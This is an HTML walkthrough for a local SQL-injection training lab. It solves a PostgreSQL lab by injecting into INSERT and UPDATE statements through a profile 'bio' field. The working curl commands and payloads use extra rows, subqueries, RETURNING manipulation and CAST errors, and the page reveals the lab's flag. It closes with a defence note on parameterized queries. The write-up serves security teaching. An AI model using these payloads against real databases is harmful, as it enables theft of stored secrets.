<h4>Step 1: Test the Registration Form</h4>
<p>
    Start by creating a normal profile to understand how the INSERT query works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=testuser" --data-urlencode "bio=Hello world"<br><br>
        <span class="prompt">Username: </span>testuser<br>
        <span class="prompt">Bio: </span>Hello world<br>
        <span class="prompt">Response: </span><strong>Profile created!</strong> id: 18
    </div>
</div>

<h4>Step 2: Understand the INSERT Query Structure</h4>
<p>
    From the terminal output, we can see the query structure:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Query Structure</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>INSERT INTO profiles (username, bio) VALUES ('testuser', 'Hello world') RETURNING id<br><br>
        <span class="prompt">// The bio field is the second parameter in VALUES</span><br>
        <span class="prompt">// We can inject by closing the string and VALUES clause</span>
    </div>
</div>

<h4>Step 3: Test Injection in the Bio Field</h4>
<p>
    Try injecting a second row to confirm the injection point works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user1" \<br>
        &nbsp;&nbsp;--data-urlencode "bio=test'), ('injected', 'second row') -- -"<br><br>
        <span class="prompt">Username: </span>user1<br>
        <span class="prompt">Bio: </span>test'), ('injected', 'second row') -- -<br>
        <span class="prompt">Query: </span>INSERT INTO profiles (username, bio) VALUES ('user1', 'test'), ('injected', 'second row') -- -') RETURNING id<br>
        <span class="prompt">Response: </span>Profile created but no data returned.<br>
        <span class="prompt">Note: </span>Two rows were inserted -- 'user1' and 'injected' (RETURNING id applies only to last result set)
    </div>
</div>

<h4>Step 4: Extract Data Using Subquery in VALUES</h4>
<p>
    Inject a subquery as the username value of a second row to extract the secret.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Subquery in VALUES</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user2" \<br>
        &nbsp;&nbsp;--data-urlencode "bio=test'), ((SELECT secret FROM credentials WHERE service='internal_api'), 'leaked') -- -"<br><br>
        <span class="prompt">Username: </span>user2<br>
        <span class="prompt">Bio: </span>test'), ((SELECT secret FROM credentials WHERE service='internal_api'), 'leaked') -- -<br>
        <span class="prompt">Query: </span>INSERT INTO profiles (username, bio) VALUES ('user2', 'test'), ((SELECT secret FROM credentials WHERE service='internal_api'), 'leaked') -- -') RETURNING id<br>
        <span class="prompt">Response: </span>Profile created but no data returned.<br>
        <span class="prompt">Note: </span>The flag is silently stored as a username in the profiles table (not echoed back)
    </div>
</div>

<h4>Step 5: RETURNING Clause Manipulation</h4>
<p>
    PostgreSQL's <code>RETURNING</code> clause is unique: it can return arbitrary
    expressions, not just column values. Manipulate it to directly extract data.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. RETURNING Manipulation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user3" \<br>
        &nbsp;&nbsp;--data-urlencode "bio=test') RETURNING (SELECT secret FROM credentials WHERE service='internal_api')::text -- -"<br><br>
        <span class="prompt">Username: </span>user3<br>
        <span class="prompt">Bio: </span>test') RETURNING (SELECT secret FROM credentials WHERE service='internal_api')::text -- -<br>
        <span class="prompt">Query: </span>INSERT INTO profiles (username, bio) VALUES ('user3', 'test') RETURNING (SELECT secret FROM credentials WHERE service='internal_api')::text -- -') RETURNING id<br>
        <span class="prompt">Response: </span><strong>Profile created!</strong><br>
        &nbsp;&nbsp;secret: FLAG{pg_1ns3rt_r3turn1ng}
    </div>
</div>

<h4>Step 6: CAST Error in INSERT Context</h4>
<p>
    The CAST error technique also works within INSERT statements:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. CAST Error in INSERT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=user4" \<br>
        &nbsp;&nbsp;--data-urlencode "bio='||(SELECT CAST(secret AS INTEGER) FROM credentials WHERE service='internal_api')||'"<br><br>
        <span class="prompt">Username: </span>user4<br>
        <span class="prompt">Bio: </span>'||(SELECT CAST(secret AS INTEGER) FROM credentials WHERE service='internal_api')||'<br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_1ns3rt_r3turn1ng}"
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Use the flag obtained from Step 5 or Step 6 and paste it into the verification form:
    <code>FLAG{pg_1ns3rt_r3turn1ng}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit (CAST Error)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab15" \<br> --data-urlencode "username=test" \<br>
        &nbsp;&nbsp;--data-urlencode "bio=' || (SELECT CAST(secret AS INTEGER) FROM credentials WHERE service='internal_api') || '"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_1ns3rt_r3turn1ng}"
    </div>
</div>

<h4>Step 8: UPDATE Injection Techniques</h4>
<p>
    INSERT is not the only statement vulnerable to injection. UPDATE statements can
    also be exploited:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. UPDATE Injection Patterns</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Typical vulnerable UPDATE</span><br>
        UPDATE profiles SET bio = '$bio' WHERE username = '$user'<br><br>
        <span class="prompt">// Inject to overwrite another column</span><br>
        <span class="prompt">Bio: </span>pwned', username=(SELECT secret FROM credentials LIMIT 1) WHERE username='alice' -- -<br>
        <span class="prompt">Effect: </span>Alice's username is replaced with the secret value<br><br>
        <span class="prompt">// PostgreSQL UPDATE ... RETURNING</span><br>
        UPDATE profiles SET bio = '$bio' WHERE id = 1 RETURNING *<br>
        <span class="prompt">Bio: </span>test' RETURNING (SELECT secret FROM credentials LIMIT 1)::text -- -<br>
        <span class="prompt">Effect: </span>Returns the secret in the RETURNING output
    </div>
</div>

<h4>Step 9: PostgreSQL RETURNING vs Other Databases</h4>
<p>
    The <code>RETURNING</code> clause is a powerful PostgreSQL-specific feature:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 9. RETURNING Comparison</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">PostgreSQL: </span>INSERT ... RETURNING *, (subquery), expression<br>
        <span class="prompt">PostgreSQL: </span>UPDATE ... RETURNING *, (subquery), expression<br>
        <span class="prompt">PostgreSQL: </span>DELETE ... RETURNING *, (subquery), expression<br><br>
        <span class="prompt">MySQL: </span>No RETURNING support (use LAST_INSERT_ID() instead)<br>
        <span class="prompt">SQLite: </span>RETURNING supported since 3.35.0 (2021)<br>
        <span class="prompt">MSSQL: </span>OUTPUT clause (similar concept, different syntax)<br><br>
        <span class="prompt">Key difference: </span>PostgreSQL RETURNING can include<br>
        arbitrary subqueries and expressions, making it<br>
        especially dangerous for INSERT/UPDATE injection.
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> INSERT and UPDATE injection vectors are often overlooked
    compared to SELECT-based attacks, but they are equally dangerous in PostgreSQL.
    The <code>RETURNING</code> clause is particularly powerful: it allows an attacker
    to embed arbitrary subqueries and have the results returned directly in the response.
    Unlike SELECT injection which requires UNION or error-based techniques, RETURNING
    provides a clean, direct data exfiltration channel. Defense: use parameterized queries
    for all DML statements (INSERT, UPDATE, DELETE), not just SELECT queries. Validate
    input length and characters before constructing queries.
</div>
